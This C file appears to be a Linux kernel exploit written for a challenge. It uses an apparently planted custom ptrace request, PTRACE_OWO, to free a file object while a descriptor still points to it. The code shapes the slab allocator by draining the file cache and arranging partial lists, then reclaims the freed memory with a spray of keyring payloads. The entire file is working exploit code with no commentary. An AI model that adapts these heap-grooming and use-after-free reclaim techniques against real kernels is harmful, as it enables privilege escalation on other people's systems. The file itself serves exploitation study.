#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <keyutils.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#define PTRACE_OWO 0x4242

static void perror_exit(const char *msg)
{
    perror(msg);
    exit(1);
}

static void child_handler()
{
    asm("int3");

    int fd;
    fd = open("./a", O_CREAT | O_RDWR | O_TRUNC, 0666);
    asm("int3");
    close(fd);
    asm("int3");
}

#define OBJS_PER_SLAB 16 // k->oo & OO_MASK
#define OBJECT_SIZE 256
#define CPU_PARTIAL_SLAB 7
#define MIN_PARTIAL 5 // partial list is stack, first in last out

#define MAX_KEYS 199
int keys[MAX_KEYS]; // user_key_payload
int fds[CPU_PARTIAL_SLAB + 1][OBJS_PER_SLAB];
int status;
int int3_cnt = 0;
int victim_fd;
pid_t p;

static inline void trigger_free()
{
    ptrace(PTRACE_CONT, p, NULL, NULL);
    wait(&status); int3_cnt++;
    printf("[int3_cnt: %d] trigger_free\n", int3_cnt);
}

static inline void trigger_create()
{
    ptrace(PTRACE_CONT, p, NULL, NULL);
    wait(&status); int3_cnt++;
    printf("[int3_cnt: %d] trigger_create\n", int3_cnt);
}

int alloc_key(int index, char *payload, int size)
{
    char desc[32] = {};
    int key;

    size -= 0x18; // sizeof(struct user_key_payload)
    sprintf(desc, "pay%d", index);

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
    if (key == -1)
        perror_exit("add_key");

    return key;
}

static void exp_handler()
{
    char name[256];

    // create 1 partial list
    trigger_free(); // because partial list is FILO, the target slab need to be first one
    // create 4 partial list 
    for (int i = 1; i < 5; i++)
        close(fds[i][0]);

    // create 3 partial and make slab-6 empty
    for (int i = 5; i < 7; i++) {
        for (int j = 0; j < OBJS_PER_SLAB; j++) {
            if (i == 6 && j == 0)
                continue;
            close(fds[i][j]);
        }
    }

    // trigger unfreeze (no.8 partial list ent)
    close(fds[0][0]);
    usleep(100000); // wait rcu

    // spray to occupy the page
    char buf[0x100] = {};
    memset(buf, 'A', sizeof(buf));
    for (int i = 0; i < 78; i++) {
        keys[i] = alloc_key(i, buf, sizeof(buf));
        if (keys[i] == -1)
            perror_exit("alloc_key");
    }
    close(victim_fd);
    getc(stdin);
}

static void setup()
{
    if (!fork()) {
        // use child process to drain the filp_cachep
        for (int i = 0; i < 500; i++)
            dup(0);
        sleep(1000000);
    }

    char name[256];
    for (int i = 0; i < CPU_PARTIAL_SLAB + 1; i++) {
        for (int j = 0; j < OBJS_PER_SLAB; j++) {
            if (i == 6 && j == 0) {
                trigger_create();
                continue;
            }

            sprintf(name, "/tmp/%d-%d", i, j);
            fds[i][j] = open(name, O_RDWR | O_CREAT | O_TRUNC, 0666);
        }
    }
}

int main()
{
    if ((p = fork()) == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        child_handler();
        exit(1);
    }
    wait(&status); int3_cnt++;
    printf("[int3_cnt: %d] child create successfully\n", int3_cnt);

    setup();
    victim_fd = ptrace(PTRACE_OWO, p, NULL, 3);
    exp_handler();

    ptrace(PTRACE_CONT, p, NULL, NULL);
    wait(&status); // exit
    return 0;
}
